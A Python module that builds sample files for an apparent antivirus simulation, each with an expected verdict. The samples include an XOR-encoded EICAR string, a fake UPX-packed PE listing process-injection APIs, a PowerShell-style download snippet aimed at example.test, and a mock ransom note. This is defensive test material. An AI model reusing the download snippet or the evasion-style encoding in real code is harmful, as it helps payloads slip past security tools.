"""Safe test samples, generated at run time.

The EICAR test string is stored XOR-encoded so this repository itself is not flagged
or deleted by antivirus software when you download it. EICAR is not malware: it is a
68-byte text string every antivirus treats as a test detection.
"""

import base64
import os
import random
import struct
import zlib

_EICAR_ENC = "Am8Vewp/GhsKAW4GCgACb25yCgRzbRkZc20nfh8TGRsIdwkOGxQeGwgedxsUDhMMEwgPCXcOHwkOdxwTFh97fhJxEnA="


def eicar_bytes():
    return bytes(b ^ 0x5A for b in base64.b64decode(_EICAR_ENC))


def _fake_packed_pe():
    """A harmless, non-runnable file that only *looks* like a packed Windows program."""
    rnd = random.Random(1337)
    dos = bytearray(b"MZ" + b"\x00" * 0x3A + struct.pack("<I", 0x80))
    dos += b"\x00" * (0x80 - len(dos))
    file_header = struct.pack("<HHIIIHH", 0x14C, 2, 0, 0, 0, 0, 0x0102)  # 2 sections, no optional header
    sec_data_off = 0x80 + 4 + 20 + 2 * 40
    s1 = rnd.randbytes(4096)
    s2 = b"\x00".join([b"VirtualAllocEx", b"WriteProcessMemory", b"CreateRemoteThread", b"IsDebuggerPresent"]) + b"\x00" * 64
    sec = lambda name, size, ptr: name.ljust(8, b"\x00") + struct.pack("<IIIIIIHHI", size, 0, size, ptr, 0, 0, 0, 0, 0)
    table = sec(b"UPX0", len(s1), sec_data_off) + sec(b"UPX1", len(s2), sec_data_off + len(s1))
    return bytes(dos) + b"PE\x00\x00" + file_header + table + s1 + s2


def _png():
    raw = b"".join(b"\x00" + bytes([30, 120, 200]) * 8 for _ in range(8))
    def chunk(t, d):
        return struct.pack(">I", len(d)) + t + d + struct.pack(">I", zlib.crc32(t + d) & 0xFFFFFFFF)
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", 8, 8, 8, 2, 0, 0, 0)) + \
        chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b"")


SAMPLES = {
    "eicar_test_file.com": ("EICAR antivirus test file (expected: Malicious)", eicar_bytes),
    "clean_notes.txt": ("Ordinary text file (expected: Clean)",
                        lambda: b"Meeting notes\n- finish the internship report\n- review scan results\n- update README\n"),
    "logo.png": ("Small valid PNG image (expected: Clean)", _png),
    "suspicious_script.txt": ("Text that mimics a PowerShell download script (expected: Suspicious)",
                              lambda: (b"# PowerShell training sample for the antivirus simulation - harmless text\n"
                                       b"$url = 'http://example.test/update'\n"
                                       b"$wc = New-Object Net.WebClient\n"
                                       b"$data = $wc.DownloadString($url)\n"
                                       b"Invoke-WebRequest -Uri $url -OutFile update.txt\n")),
    "ransom_note_sample.txt": ("Text that mimics a ransom note (expected: Suspicious)",
                               lambda: (b"ATTENTION! Your files have been encrypted.\n"
                                        b"To decrypt them, pay 0.05 bitcoin to the wallet below.\n"
                                        b"(Training sample for an antivirus simulation. Nothing was encrypted.)\n")),
    "fake_packed_program.bin": ("Harmless file that looks like a packed program with injection APIs (expected: Malicious)",
                                _fake_packed_pe),
    "random_data.bin": ("Random bytes: high entropy alone is not enough (expected: Clean, with one finding)",
                        lambda: random.Random(7).randbytes(65536)),
    "invoice.pdf.exe": ("Plain text with a double extension (expected: Suspicious)",
                        lambda: b"This is only text, but the name pretends to be a PDF.\n"),
}


def create_samples(folder, names=None):
    os.makedirs(folder, exist_ok=True)
    out = []
    for name, (desc, make) in SAMPLES.items():
        if names and name not in names:
            continue
        p = os.path.join(folder, name)
        with open(p, "wb") as fh:
            fh.write(make())
        out.append(p)
    return out
